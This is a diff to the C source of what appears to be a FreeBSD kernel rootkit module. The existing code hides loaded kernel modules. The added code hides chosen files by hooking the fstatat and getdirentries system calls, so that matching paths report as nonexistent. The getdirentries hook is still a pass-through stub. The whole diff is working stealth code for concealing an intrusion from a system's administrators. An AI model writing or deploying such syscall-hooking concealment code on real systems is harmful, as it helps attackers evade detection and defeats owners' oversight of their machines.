@@ -7,10 +7,22 @@
  */
 #include <freebsd/incantations.h>
 #include <freebsd/externals.h>
+#include <utils/icloak_ctx.h>
+#include <kook.h>
 
 static struct linker_file *find_kld(const char *name);
 
 static struct module *find_mod(const char *name);
+
+static int icloak_fstatat(struct thread *td, struct fstatat_args *args);
+
+static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args);
+
+int (*fstatat_syscall)(struct thread *td, struct fstatat_args *args) = NULL;
+
+int (*getdirentries_syscall)(struct thread *td, struct getdirentries_args *args) = NULL;
+
+static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL, *g_icloak_hidden_patterns_tail = NULL;
 
 int native_icloak_ko(const char *name) {
     struct linker_file *kld;
@@ -112,6 +124,68 @@ int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
     mtx_unlock(&Giant);
 
     return error;
+}
+
+int native_hide_file(const char *pattern) {
+    if (pattern == NULL) {
+        return 1;
+    }
+
+    if (fstatat_syscall == NULL) {
+        kook(SYS_fstatat, icloak_fstatat, (void **)&fstatat_syscall);
+    }
+
+    if (getdirentries_syscall == NULL) {
+        kook(SYS_getdirentries, icloak_getdirentries, (void **)&getdirentries_syscall);
+    }
+
+    g_icloak_hidden_patterns = icloak_add_filename_pattern(g_icloak_hidden_patterns,
+                                                           pattern, strlen(pattern), &g_icloak_hidden_patterns_tail);
+
+    return 0;
+}
+
+int native_show_file(const char *pattern) {
+    if (pattern == NULL) {
+        return 1;
+    }
+
+    g_icloak_hidden_patterns = icloak_del_filename_pattern(g_icloak_hidden_patterns, pattern);
+
+    // INFO(Rafael): When empty we will undo the hooks.
+
+    if (g_icloak_hidden_patterns == NULL) {
+        if (fstatat_syscall != NULL) {
+            if (kook(SYS_fstatat, fstatat_syscall, NULL) == 0) {
+                fstatat_syscall = NULL;
+            }
+        }
+
+        if (getdirentries_syscall != NULL) {
+            if (kook(SYS_getdirentries, getdirentries_syscall, NULL) == 0) {
+                getdirentries_syscall = NULL;
+            }
+        }
+    }
+
+    return 0;
+}
+
+static int icloak_fstatat(struct thread *td, struct fstatat_args *args) {
+    int matches;
+
+    matches = icloak_match_filename(args->path, g_icloak_hidden_patterns);
+
+    if (matches) {
+        return -ENOENT;
+    }
+
+    return fstatat_syscall(td, args);
+}
+
+static int icloak_getdirentries(struct thread *td, struct getdirentries_args *args) {
+    int total = getdirentries_syscall(td, args);
+    return total;
 }
 
 static struct linker_file *find_kld(const char *name) {
